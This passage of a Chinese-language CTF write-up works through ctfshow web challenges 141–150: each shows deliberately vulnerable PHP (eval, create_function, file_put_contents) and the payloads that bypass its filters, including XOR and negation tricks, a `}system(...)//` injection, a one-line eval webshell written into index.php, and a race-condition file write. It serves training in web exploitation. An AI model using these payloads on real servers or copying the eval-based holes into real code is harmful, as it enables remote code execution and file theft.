class="string">&#x27;/^\W+$/&#x27;</span>, <span class="variable">$v3</span>))&#123;</span><br><span class="line">            <span class="variable">$code</span> =  <span class="keyword">eval</span>(<span class="string">&quot;return <span class="subst">$v1</span><span class="subst">$v3</span><span class="subst">$v2</span>;&quot;</span>);</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;<span class="subst">$v1</span><span class="subst">$v3</span><span class="subst">$v2</span> = &quot;</span>.<span class="variable">$code</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><a href="https://blog.csdn.net/miuzzx/article/details/109143413">绕过无字母数字的方法参考yu师傅的脚本</a>：这里直接利用取反脚本</p><p>绕过return的方式：<br>php中有个有意思的地方，数字是可以和命令进行一些运算的，例如 1-phpinfo();结合减号是可以执行phpinfo()命令的。（不一定是减号，还有加、乘、除号，若用加号。要用+，要进行URL编码，这是个特殊字符，不进行编码会当作空格）</p><h1 id="web-142"><a href="#web-142" class="headerlink" title="web 142"></a>web 142</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$v1</span> = (<span class="keyword">String</span>)<span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(is_numeric(<span class="variable">$v1</span>))&#123;</span><br><span class="line">        <span class="variable">$d</span> = (<span class="keyword">int</span>)(<span class="variable">$v1</span> * <span class="number">0x36d</span> * <span class="number">0x36d</span> * <span class="number">0x36d</span> * <span class="number">0x36d</span> * <span class="number">0x36d</span>);</span><br><span class="line">        sleep(<span class="variable">$d</span>);</span><br><span class="line">        <span class="keyword">echo</span> file_get_contents(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">payload:</span><br><span class="line">?v1=0   八进制</span><br><span class="line">?v1=0x016进制</span><br><span class="line">?v1=0e123科学计数法</span><br></pre></td></tr></table></figure><h1 id="web-143"><a href="#web-143" class="headerlink" title="web 143"></a>web 143</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v3&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$v1</span> = (<span class="keyword">String</span>)<span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line">    <span class="variable">$v2</span> = (<span class="keyword">String</span>)<span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>];</span><br><span class="line">    <span class="variable">$v3</span> = (<span class="keyword">String</span>)<span class="variable">$_GET</span>[<span class="string">&#x27;v3&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(is_numeric(<span class="variable">$v1</span>) &amp;&amp; is_numeric(<span class="variable">$v2</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/[a-z]|[0-9]|\+|\-|\.|\_|\||\$|\&#123;|\&#125;|\~|\%|\&amp;|\;/i&#x27;</span>, <span class="variable">$v3</span>))&#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&#x27;get out hacker!&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="variable">$code</span> =  <span class="keyword">eval</span>(<span class="string">&quot;return <span class="subst">$v1</span><span class="subst">$v3</span><span class="subst">$v2</span>;&quot;</span>);</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;<span class="subst">$v1</span><span class="subst">$v3</span><span class="subst">$v2</span> = &quot;</span>.<span class="variable">$code</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>更改正则使用异或绕过</p><h1 id="web-144"><a href="#web-144" class="headerlink" title="web 144"></a>web 144</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v3&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$v1</span> = (<span class="keyword">String</span>)<span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line">    <span class="variable">$v2</span> = (<span class="keyword">String</span>)<span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>];</span><br><span class="line">    <span class="variable">$v3</span> = (<span class="keyword">String</span>)<span class="variable">$_GET</span>[<span class="string">&#x27;v3&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(is_numeric(<span class="variable">$v1</span>) &amp;&amp; check(<span class="variable">$v3</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/^\W+$/&#x27;</span>, <span class="variable">$v2</span>))&#123;</span><br><span class="line">            <span class="variable">$code</span> =  <span class="keyword">eval</span>(<span class="string">&quot;return <span class="subst">$v1</span><span class="subst">$v3</span><span class="subst">$v2</span>;&quot;</span>);</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;<span class="subst">$v1</span><span class="subst">$v3</span><span class="subst">$v2</span> = &quot;</span>.<span class="variable">$code</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> strlen(<span class="variable">$str</span>)===<span class="number">1</span>?<span class="literal">true</span>:<span class="literal">false</span>;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><h1 id="web-145"><a href="#web-145" class="headerlink" title="web 145"></a>web 145</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v3&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$v1</span> = (<span class="keyword">String</span>)<span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line">    <span class="variable">$v2</span> = (<span class="keyword">String</span>)<span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>];</span><br><span class="line">    <span class="variable">$v3</span> = (<span class="keyword">String</span>)<span class="variable">$_GET</span>[<span class="string">&#x27;v3&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(is_numeric(<span class="variable">$v1</span>) &amp;&amp; is_numeric(<span class="variable">$v2</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/[a-z]|[0-9]|\@|\!|\+|\-|\.|\_|\$|\&#125;|\%|\&amp;|\;|\&lt;|\&gt;|\*|\/|\^|\#|\&quot;/i&#x27;</span>, <span class="variable">$v3</span>))&#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&#x27;get out hacker!&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="variable">$code</span> =  <span class="keyword">eval</span>(<span class="string">&quot;return <span class="subst">$v1</span><span class="subst">$v3</span><span class="subst">$v2</span>;&quot;</span>);</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;<span class="subst">$v1</span><span class="subst">$v3</span><span class="subst">$v2</span> = &quot;</span>.<span class="variable">$code</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>测试：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">eval</span>(<span class="string">&quot;return 1?phpinfo():1;&quot;</span>);</span><br></pre></td></tr></table></figure><p>这是可以运行出来的</p><p>没有过滤~直接取反绕过</p><h1 id="web-146"><a href="#web-146" class="headerlink" title="web 146"></a>web 146</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v3&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$v1</span> = (<span class="keyword">String</span>)<span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line">    <span class="variable">$v2</span> = (<span class="keyword">String</span>)<span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>];</span><br><span class="line">    <span class="variable">$v3</span> = (<span class="keyword">String</span>)<span class="variable">$_GET</span>[<span class="string">&#x27;v3&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(is_numeric(<span class="variable">$v1</span>) &amp;&amp; is_numeric(<span class="variable">$v2</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/[a-z]|[0-9]|\@|\!|\:|\+|\-|\.|\_|\$|\&#125;|\%|\&amp;|\;|\&lt;|\&gt;|\*|\/|\^|\#|\&quot;/i&#x27;</span>, <span class="variable">$v3</span>))&#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&#x27;get out hacker!&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="variable">$code</span> =  <span class="keyword">eval</span>(<span class="string">&quot;return <span class="subst">$v1</span><span class="subst">$v3</span><span class="subst">$v2</span>;&quot;</span>);</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;<span class="subst">$v1</span><span class="subst">$v3</span><span class="subst">$v2</span> = &quot;</span>.<span class="variable">$code</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>又增加了分号的过滤，所以我们没法用三目运算符了，这时候想到了等号和位运算符</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">eval</span>(<span class="string">&quot;return 1==phpinfo()||1;&quot;</span>);</span><br></pre></td></tr></table></figure><p>直接取反绕过即可</p><h1 id="web-147"><a href="#web-147" class="headerlink" title="web 147"></a>web 147</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;ctf&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$ctfshow</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;ctf&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&#x27;/^[a-z0-9_]*$/isD&#x27;</span>,<span class="variable">$ctfshow</span>)) &#123;</span><br><span class="line">        <span class="variable">$ctfshow</span>(<span class="string">&#x27;&#x27;</span>,<span class="variable">$_GET</span>[<span class="string">&#x27;show&#x27;</span>]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p><strong>分析正则表达式：</strong><br> <code>/i</code>不区分大小写<br> <code>/s</code>匹配任何不可见字符，包括空格、制表符、换页符等等，等价于<code>[\f\n\r\t\v]</code><br> <code>/D</code>如果使用$限制结尾字符,则不允许结尾有换行</p><p><strong>create_function:</strong></p><p><a href="https://paper.seebug.org/755/">参考这篇文章第一道题</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">create_function()主要用来创建匿名函数,有时候匿名函数可以发挥它的作用。</span><br><span class="line"></span><br><span class="line">string create_function    ( string $args   , string $code   )</span><br><span class="line"></span><br><span class="line">string $args 参数部分</span><br><span class="line">string $code 方法代码部分</span><br><span class="line"></span><br><span class="line">举例：</span><br><span class="line"></span><br><span class="line">create_function(&#x27;$name&#x27;,&#x27;echo $fname.&quot;Zhang&quot;&#x27;)</span><br><span class="line">类似于：</span><br><span class="line"></span><br><span class="line">function fT($name) &#123;</span><br><span class="line">  echo $fname.&quot;Zhang&quot;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>绕过匹配的方式很简单：需要在开头或者结尾找到一一个字符同时不影响函数的正常调用</p><p>现场制作一个fuzz用的字典：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$myfile</span> = fopen(<span class="string">&quot;ascii.txt&quot;</span>,<span class="string">&quot;w&quot;</span>);</span><br><span class="line"><span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>;<span class="variable">$i</span> &lt; <span class="number">129</span>; <span class="variable">$i</span>++)&#123;</span><br><span class="line"><span class="variable">$a</span> = chr(<span class="variable">$i</span>);</span><br><span class="line"><span class="keyword">if</span>(!preg_match(<span class="string">&#x27;/[a-z0-9]/isD&#x27;</span>,<span class="variable">$a</span>))&#123;</span><br><span class="line">preg_replace(<span class="string">&#x27;/[a-z0-9]/isD&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="variable">$a</span>);</span><br><span class="line"><span class="variable">$b</span> = urlencode(<span class="variable">$a</span>).<span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="comment">//$c = &quot;未编码：&quot;.$a.&quot;经过编码：&quot;.$b.&quot;\n&quot;;</span></span><br><span class="line">fwrite(<span class="variable">$myfile</span>,<span class="variable">$b</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//echo $c;</span></span><br><span class="line">&#125;</span><br><span class="line">fclose(<span class="variable">$myfile</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>然后复制本题目代码本地搭建：开始寻找命中字符</p><p>先构造payload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">create_function(&#x27;&#x27;,$_GET[&#x27;show&#x27;])</span><br><span class="line">function hacker($hackername) &#123;</span><br><span class="line">&#125;echo &quot;yn8rt&quot;;//</span><br><span class="line">&#125;</span><br><span class="line">所以：</span><br><span class="line">create_function(&#x27;&#x27;,&#x27;&#125;echo &quot;yn8rt&quot;;//&#x27;)</span><br><span class="line">payload:</span><br><span class="line">?show=&#125;echo &quot;yn8rt&quot;;//</span><br><span class="line">post:ctf=%create_function</span><br></pre></td></tr></table></figure><p>开始fuzz：</p><p><img src="https://img-blog.csdnimg.cn/img_convert/9d8148dd7353af8c807d7e233b2a3037.png" alt="img"></p><p>payload：</p><p>?show=}system(‘tac f*’);//</p><p>ctf=%5ccreate_function</p><p>而事实上%5c就是\：</p><p>在PHP的命名空间默认为\，所有的函数和类都在\这个命名空间中，如果直接写函数名function_name()调用，调用的时候其实相当于写了一个相对路径；而如果写\function_name()这样调用函数，则其实是写了一个绝对路径。如果你在其他namespace里调用系统类，就必须写绝对路径这种写法</p><h1 id="web-148"><a href="#web-148" class="headerlink" title="web 148"></a>web 148</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$code</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&quot;/[A-Za-z0-9_\%\\|\~\&#x27;\,\.\:\@\&amp;\*\+\- ]+/&quot;</span>,<span class="variable">$code</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;error&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    @<span class="keyword">eval</span>(<span class="variable">$code</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_ctfshow_fl0g</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> file_get_contents(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">code=$哈=&quot;`&#123;&#123;&#123;&quot;^&quot;?&lt;&gt;/&quot;;$&#123;$哈&#125;[哼]($&#123;$哈&#125;[嗯]);&amp;哼=system&amp;嗯=tac f*</span><br><span class="line">&quot;`&#123;&#123;&#123;&quot;^&quot;?&lt;&gt;/&quot;; 异或出来的结果是 _GET</span><br><span class="line">$&#123;_GET&#125;[哼]($&#123;_GET&#125;[嗯]);&amp;哼=call_user_func&amp;嗯=get_ctfshow_fl0g</span><br></pre></td></tr></table></figure><p>这里是直接一个回调，利用现成的函数来读取flag.php</p><h1 id="web-149"><a href="#web-149" class="headerlink" title="web 149"></a>web 149</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$files</span> = scandir(<span class="string">&#x27;./&#x27;</span>); </span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$files</span> <span class="keyword">as</span> <span class="variable">$file</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span>(is_file(<span class="variable">$file</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$file</span> !== <span class="string">&quot;index.php&quot;</span>) &#123;</span><br><span class="line">            unlink(<span class="variable">$file</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">file_put_contents(<span class="variable">$_GET</span>[<span class="string">&#x27;ctf&#x27;</span>], <span class="variable">$_POST</span>[<span class="string">&#x27;show&#x27;</span>]);</span><br><span class="line"></span><br><span class="line"><span class="variable">$files</span> = scandir(<span class="string">&#x27;./&#x27;</span>); </span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$files</span> <span class="keyword">as</span> <span class="variable">$file</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span>(is_file(<span class="variable">$file</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$file</span> !== <span class="string">&quot;index.php&quot;</span>) &#123;</span><br><span class="line">            unlink(<span class="variable">$file</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>方法一：</p><p>你不删除index.php，那么我就往index.php中写个木马</p><pre><code>?ctf=index.phpshow=&lt;?php @eval($_POST[&#39;yn8rt&#39;]);?&gt;</code></pre><p>方法二：</p><p>条件竞争：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?ctf=1.php</span><br><span class="line">show=&lt;?php system(&#x27;tac /f*&#x27;);?&gt;</span><br></pre></td></tr></table></figure><h1 id="web-150"><a href="#web-150" class="headerlink" title="web 150"></a>web 150</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CTFSHOW</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$username</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$password</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$vip</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$secret</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;vip = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;secret = <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;secret;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">isVIP</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;vip?<span class="literal">TRUE</span>:<span class="literal">FALSE</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__autoload</span>(<span class="params"><span class="variable">$class</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$class</span>))&#123;</span><br><span class="line">            <span class="variable">$class</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">#过滤字符</span></span><br><span class="line"><span class="variable">$key</span> = <span class="variable">$_SERVER</span>[<span class="string">&#x27;QUERY_STRING&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&#x27;/\_| |\[|\]|\?/&#x27;</span>, <span class="variable">$key</span>))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;error&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$ctf</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;ctf&#x27;</span>];</span><br><span class="line">extract(<span class="variable">$_GET</span>);</span><br><span class="line"><span class="keyword">if</span>(class_exists(<span class="variable">$__CTFSHOW__</span>))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;class is 